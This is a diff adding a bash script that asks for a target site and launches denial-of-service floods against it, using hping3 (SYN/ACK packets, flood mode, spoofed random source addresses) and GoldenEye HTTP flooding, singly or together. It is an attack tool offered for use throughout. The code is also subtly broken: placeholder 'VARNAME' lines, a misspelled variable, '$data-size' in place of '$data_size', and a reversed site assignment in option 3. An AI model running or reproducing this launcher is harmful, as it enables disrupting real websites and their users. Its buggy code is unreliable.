@@ -1,0 +1,84 @@
+#!/bin/bash
+
+VARNAME="hping3_site"
+VARNAME="packet_count"
+VARNAME="data_size"                                       #default: 0
+VARNAME="win_size"                                        #default: 64...
+VARNMAE="flag"                                            #SYN or ACK
+VARNAME="port"                                            #suggest nmap scan
+VARNAME="flood"                                           #flood or no
+VARNAME="rand_source"                                     #random or no
+
+VARNAME="goldeneye_site"
+VARNAME="workers"                                         #default: 10
+VARNAME="sockets"                                         #default: 10
+VARNAME="method"                                          #default: get
+VARNAME="debug"                                           #default: false
+
+
+VARNAME="choice"
+
+echo -e "1. HPing3\n2. GoldenEye\n3. All"
+read -p "> " choice
+case $choice in
+    1 ) read -p "site: " hping3_site; read -p "packet count: " packet_count; read -p "data size(default: 0): " data_size; read -p "winsize(default: 64): " win_size; read -p "flag([S]YN/[A]CK): " flag; read -p "port: " port; read -p "flood?(y/n): " flood; read -p "random source?(y/n)" rand_source;
+        case $flag in
+            [Ss]* ) flag=-S;;
+            [Aa]* ) flag=-A;;
+            SYN ) flag=-S;;
+            ACK ) flag=-A;;
+            syn ) flag=-S;;
+            ack ) flag=-A;;
+        esac
+        case $flood in
+            [Yy]* ) flood=--flood;;
+            [Nn]* ) flood= ;;
+        esac
+        case $rand_source in
+            [Yy]* ) rand_source=--rand-source;;
+            [Nn]* ) rand_source= ;;
+        esac
+        gnome-terminal -e "./library/hping3 -c $packet_count -d $data-size $flag -w $win_size -p $port $flood $rand_source $hping3_site";;
+    
+    2 ) read -p "site: " goldeneye_site; read -p "workers(default: 10): " workers; read -p "sockets(default: 10): " sockets; read -p "method([g]et/[p]ost/[r]andom [default: get]): " method; read -p "debug(y/n): " debug;
+        case $method in
+            [Gg]* ) method=get;;
+            [Pp]* ) method=post;;
+            [Rr]* ) method=random;;
+        esac
+        case $debug in
+            [Yy]* ) debug=true;;
+            [Nn]* ) debug=false;;
+        esac
+        gnome-terminal -e "./library/goldeneye http://$goldeneye_site -w $workers -s $sockets -m $method -d $debug";;
+
+    3 ) read -p "site: " hping3_site; read -p "workers(default: 10): " workers; read -p "sockets(default: 10): " sockets; read -p "method([g]et/[p]ost/[r]andom [default: get]): " method; read -p "packet count: " packet_count; read -p "data size(default: 0): " data_size; read -p "winsize(default: 64): " win_size; read -p "flag([S]YN/[A]CK): " flag; read -p "port: " port; read -p "flood?(y/n): " flood; read -p "random source?(y/n)" rand_source; read -p "debug(y/n): " debug;
+        case $flag in
+            [Ss]* ) flag=-S;;
+            [Aa]* ) flag=-A;;
+            SYN ) flag=-S;;
+            ACK ) flag=-A;;
+            syn ) flag=-S;;
+            ack ) flag=-A;;
+        esac
+        case $flood in
+            [Yy]* ) flood=--flood;;
+            [Nn]* ) flood= ;;
+        esac
+        case $rand_source in
+            [Yy]* ) rand_source=--rand-source;;
+            [Nn]* ) rand_source= ;;
+        esac
+        case $method in
+            [Gg]* ) method=get;;
+            [Pp]* ) method=post;;
+            [Rr]* ) method=random;;
+        esac
+        case $debug in
+            [Yy]* ) debug=true;;
+            [Nn]* ) debug=false;;
+        esac
+        gnome-terminal -e "./library/hping3 -c $packet_count -d $data-size $flag -w $win_size -p $port $flood $rand_source $hping3_site";
+        hping3_site=goldeneye_site;
+        gnome-terminal -e "./library/goldeneye http://$goldeneye_site -w $workers -s $sockets -m $method -d $debug";;
+esac
